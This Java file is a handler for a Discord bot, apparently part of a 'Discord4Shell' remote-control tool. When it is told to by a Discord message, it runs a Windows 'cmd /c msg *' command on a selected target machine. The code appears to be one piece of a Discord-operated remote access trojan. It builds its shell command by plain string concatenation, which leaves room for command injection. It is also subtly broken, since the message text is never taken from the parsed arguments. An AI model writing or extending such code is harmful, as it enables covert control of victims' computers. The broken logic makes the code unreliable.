package org.example.commands;

import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;

import java.io.IOException;
import java.util.Objects;

import static org.example.Discord4Shell.Discord4Shell.user;
import static org.example.commands.SelectTargetMessage.SelectedTarget;

public class MessageTargetMessage extends ListenerAdapter {
    public static String Message = null;
    public void onMessageReceived(MessageReceivedEvent event) {
        if (event.getAuthor().isBot()) {
            return;
        }

        if (event.getMessage().getContentRaw().contains("MessageTarget")) {
            String[] args = event.getMessage().getContentRaw().split(" ");


            if(Objects.equals(SelectedTarget, user)) {
                try {
                    Runtime.getRuntime().exec("cmd /c msg * " + Message);
                } catch (IOException e) {
                    event.getChannel().sendMessage("Message Not Able To Send").queue();
                }
            }
        }
    }
}